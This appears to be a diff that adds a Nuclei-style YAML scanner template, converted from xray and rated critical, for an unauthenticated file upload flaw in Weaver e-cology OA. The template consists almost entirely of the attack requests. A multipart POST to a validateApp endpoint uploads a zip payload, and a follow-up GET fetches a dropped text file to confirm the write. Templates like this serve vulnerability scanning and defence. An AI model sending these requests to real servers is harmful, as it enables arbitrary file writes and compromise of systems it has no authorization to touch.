@@ -1,0 +1,37 @@
+id: yaml-poc-weaver-weaver_e_cology_oa-file_upload-CT-530634
+
+info:
+  name: yaml-poc-weaver-weaver_e_cology_oa-file_upload-CT-530634
+  author: haiqing.chen
+  severity: critical
+  tags: xray-converted,fileupload
+
+http:
+  - raw:
+      - |
+        POST /weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----{{rand_int(1000, 9999)}}
+
+        ------{{rand_int(1000, 9999)}}
+        Content-Disposition: form-data; name="file"; filename="test.zip"
+        Content-Type: application/zip
+        
+        {{zipData}}
+        ------{{rand_int(1000, 9999)}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /cloudstore/login_xray.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
